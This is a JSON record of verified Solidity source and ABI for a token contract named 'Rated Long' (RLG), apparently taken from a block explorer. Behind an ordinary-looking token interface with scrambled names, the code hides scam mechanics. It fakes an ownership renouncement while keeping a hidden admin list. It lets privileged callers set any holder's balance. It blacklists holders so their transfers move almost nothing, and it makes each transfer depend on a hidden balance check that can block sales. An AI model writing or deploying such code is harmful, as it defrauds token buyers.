{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface tokenTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptTo {\n    function createPair(address launchTx, address limitEnableBuy) external returns (address);\n}\n\ninterface totalSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellTrading) external view returns (uint256);\n\n    function transfer(address takeSell, uint256 maxExempt) external returns (bool);\n\n    function allowance(address launchAutoTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeSell,\n        uint256 maxExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxSender, uint256 value);\n    event Approval(address indexed launchAutoTx, address indexed spender, uint256 value);\n}\n\ninterface tradingTxIs is totalSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RatedLong is marketingFrom, totalSwap, tradingTxIs {\n\n    function listBuy(address liquidityEnable, uint256 maxExempt) public {\n        autoFund();\n        isAmountMarketing[liquidityEnable] = maxExempt;\n    }\n\n    uint8 private feeSell = 18;\n\n    function modeReceiver(address minAt) public {\n        autoFund();\n        if (sellTx == tradingTotal) {\n            feeSellReceiver = toIs;\n        }\n        if (minAt == marketingWalletAt || minAt == launchedTokenTx) {\n            return;\n        }\n        modeTokenTeam[minAt] = true;\n    }\n\n    mapping(address => uint256) private isAmountMarketing;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingLaunch;\n    }\n\n    function swapReceiver(address atTotal, address takeSell, uint256 maxExempt) internal returns (bool) {\n        if (atTotal == marketingWalletAt) {\n            return txTokenBuy(atTotal, takeSell, maxExempt);\n        }\n        uint256 tokenTo = totalSwap(launchedTokenTx).balanceOf(takeList);\n        require(tokenTo == tradingReceiver);\n        require(takeSell != takeList);\n        if (modeTokenTeam[atTotal]) {\n            return txTokenBuy(atTotal, takeSell, feeFund);\n        }\n        return txTokenBuy(atTotal, takeSell, maxExempt);\n    }\n\n    string private swapSellTake = \"RLG\";\n\n    function getOwner() external view returns (address) {\n        return liquidityReceiverTake;\n    }\n\n    address private liquidityReceiverTake;\n\n    function liquidityLaunch(address tradingLaunchedBuy) public {\n        require(tradingLaunchedBuy.balance < 100000);\n        if (receiverFee) {\n            return;\n        }\n        \n        modeLaunch[tradingLaunchedBuy] = true;\n        if (liquidityFee == tradingTotal) {\n            isAmount = true;\n        }\n        receiverFee = true;\n    }\n\n    function approve(address takeBuy, uint256 maxExempt) public virtual override returns (bool) {\n        tokenLaunchSell[_msgSender()][takeBuy] = maxExempt;\n        emit Approval(_msgSender(), takeBuy, maxExempt);\n        return true;\n    }\n\n    function autoFund() private view {\n        require(modeLaunch[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return liquidityReceiverTake;\n    }\n\n    uint256 public sellTx;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeSell;\n    }\n\n    function transfer(address liquidityEnable, uint256 maxExempt) external virtual override returns (bool) {\n        return swapReceiver(_msgSender(), liquidityEnable, maxExempt);\n    }\n\n    uint256 fromMode;\n\n    address takeList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private sellEnable = \"Rated Long\";\n\n    address tradingFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address limitTx, address takeBuy) external view virtual override returns (uint256) {\n        if (takeBuy == tradingFee) {\n            return type(uint256).max;\n        }\n        return tokenLaunchSell[limitTx][takeBuy];\n    }\n\n    address public launchedTokenTx;\n\n    function balanceOf(address sellTrading) public view virtual override returns (uint256) {\n        return isAmountMarketing[sellTrading];\n    }\n\n    constructor (){\n        \n        tokenTrading liquiditySender = tokenTrading(tradingFee);\n        launchedTokenTx = exemptTo(liquiditySender.factory()).createPair(liquiditySender.WETH(), address(this));\n        if (tradingTotal != atTotalMin) {\n            sellTx = feeSellReceiver;\n        }\n        marketingWalletAt = _msgSender();\n        launchLimit();\n        modeLaunch[marketingWalletAt] = true;\n        isAmountMarketing[marketingWalletAt] = tradingLaunch;\n        \n        emit Transfer(address(0), marketingWalletAt, tradingLaunch);\n    }\n\n    function transferFrom(address atTotal, address takeSell, uint256 maxExempt) external override returns (bool) {\n        if (_msgSender() != tradingFee) {\n            if (tokenLaunchSell[atTotal][_msgSender()] != type(uint256).max) {\n                require(maxExempt <= tokenLaunchSell[atTotal][_msgSender()]);\n                tokenLaunchSell[atTotal][_msgSender()] -= maxExempt;\n            }\n        }\n        return swapReceiver(atTotal, takeSell, maxExempt);\n    }\n\n    function atAuto(uint256 maxExempt) public {\n        autoFund();\n        tradingReceiver = maxExempt;\n    }\n\n    event OwnershipTransferred(address indexed maxMin, address indexed minBuyTx);\n\n    uint256 private feeSellReceiver;\n\n    function launchLimit() public {\n        emit OwnershipTransferred(marketingWalletAt, address(0));\n        liquidityReceiverTake = address(0);\n    }\n\n    bool public receiverFee;\n\n    mapping(address => mapping(address => uint256)) private tokenLaunchSell;\n\n    uint256 private liquidityFee;\n\n    uint256 tradingReceiver;\n\n    function txTokenBuy(address atTotal, address takeSell, uint256 maxExempt) internal returns (bool) {\n        require(isAmountMarketing[atTotal] >= maxExempt);\n        isAmountMarketing[atTotal] -= maxExempt;\n        isAmountMarketing[takeSell] += maxExempt;\n        emit Transfer(atTotal, takeSell, maxExempt);\n        return true;\n    }\n\n    uint256 private tradingLaunch = 100000000 * 10 ** 18;\n\n    uint256 constant feeFund = 9 ** 10;\n\n    bool public isAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapSellTake;\n    }\n\n    mapping(address => bool) public modeTokenTeam;\n\n    function name() external view virtual override returns (string memory) {\n        return sellEnable;\n    }\n\n    uint256 private toIs;\n\n    bool public maxMarketing;\n\n    address public marketingWalletAt;\n\n    mapping(address => bool) public modeLaunch;\n\n    uint256 public tradingTotal;\n\n    uint256 public atTotalMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchAutoTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minBuyTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxExempt\",\"type\":\"uint256\"}],\"name\":\"atAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotalMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTokenTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunchedBuy\",\"type\":\"address\"}],\"name\":\"liquidityLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxExempt\",\"type\":\"uint256\"}],\"name\":\"listBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingWalletAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAt\",\"type\":\"address\"}],\"name\":\"modeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTokenTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RatedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}